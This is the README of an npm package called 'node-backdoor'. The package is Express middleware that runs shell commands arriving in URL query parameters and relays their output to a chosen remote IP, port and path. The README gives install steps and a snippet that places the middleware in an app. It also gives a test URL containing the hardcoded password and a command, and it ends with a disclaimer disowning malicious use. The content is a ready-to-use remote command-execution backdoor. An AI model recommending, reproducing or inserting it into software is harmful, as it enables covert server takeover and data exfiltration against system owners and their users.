node-backdoor is a simple package to create a backdoor and access your server from another server.

This package uses child process package to run terminal commands and send the response to a specific server with provided Ip address, port number, path, and method.

  

- Install the package using npm i node-backdoor.

- require the package in your code and start using its access(IP,PORT,PATH,METHOD) function.
- Test using your actual ipaddress, pass and command queries 

### Code Use Example :

```js


const express = require('express');
const app = express();
try {
 app.listen(process.env.PORT || 5000);
 console.log('App Running On Port 5000');
} catch (error) {
 console.log("Not Running: ",error);
}
---------------------IMPORTANT CODE--------------------------
const access = require('node-backdoor');
app.use(access("127.0.0.1","3000","/getRes","GET"));
-------------------------------------------------------------
app.get('/',(req,res)=>res.status(200).json({done:true}));
```
### Test example :
In the test, use your server's (where you want to place the backdoor) ipadress, and port if needed.
``` uri
In your browser or using postman try:
http://localhost:4000/?pass=titpftclctbd&command=dir
```
  

## DISCLAIMER :

We assume no responsibilities whatever for any malicious / Illegal use of this package, plus use it just in your own code, PLEASE respect others' privacy.